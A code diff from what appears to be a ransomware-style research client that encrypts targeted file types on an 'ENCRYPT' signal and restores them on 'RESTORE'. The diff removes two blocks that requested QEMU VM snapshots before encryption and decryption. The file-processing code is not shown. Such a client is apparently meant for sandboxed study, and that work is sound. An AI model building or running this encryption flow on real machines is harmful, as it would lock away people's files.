@@ -268,26 +268,6 @@ def main():
             return
         print("[client] Received ENCRYPT signal – starting file processing…")
         try:
-            # Best-effort: trigger VM snapshot BEFORE encryption via QMP on localhost:5959
-            try:
-                import json as _json
-                import socket as _socket
-                _s = _socket.socket()
-                _s.settimeout(0.5)
-                _s.connect(("127.0.0.1", 5959))
-                try:
-                    _ = _s.recv(4096)  # greeting
-                    _s.sendall(b'{"execute":"qmp_capabilities"}\n')
-                    _ = _s.recv(4096)
-                    snap = {"execute":"savevm", "arguments": {"name": "before_encryption"}}
-                    _s.sendall((_json.dumps(snap) + "\n").encode())
-                    _ = _s.recv(65536)
-                finally:
-                    _s.close()
-                print("[client] QMP snapshot 'before_encryption' requested")
-            except Exception as e:
-                print(f"[client] QMP snapshot (before_encryption) failed or skipped: {e}")
-
             state["encryption_started"] = True
             # Process only targeted file types (.png, .pdf, .xls, .txt, .mp4)
             files = processor.process_files(backup_mode=False)
@@ -348,26 +328,6 @@ def main():
         print("[client] Received RESTORE signal – recovering files…")
         # Read key data and restore files
         try:
-            # Best-effort: trigger VM snapshot BEFORE decryption via QMP on localhost:5959
-            try:
-                import json as _json
-                import socket as _socket
-                _s = _socket.socket()
-                _s.settimeout(0.5)
-                _s.connect(("127.0.0.1", 5959))
-                try:
-                    _ = _s.recv(4096)  # greeting
-                    _s.sendall(b'{"execute":"qmp_capabilities"}\n')
-                    _ = _s.recv(4096)
-                    snap = {"execute":"savevm", "arguments": {"name": "before_decryption"}}
-                    _s.sendall((_json.dumps(snap) + "\n").encode())
-                    _ = _s.recv(65536)
-                finally:
-                    _s.close()
-                print("[client] QMP snapshot 'before_decryption' requested")
-            except Exception as e:
-                print(f"[client] QMP snapshot (before_decryption) failed or skipped: {e}")
-
             key_path = _device_key_path()
             if os.path.exists(key_path):
                 try:
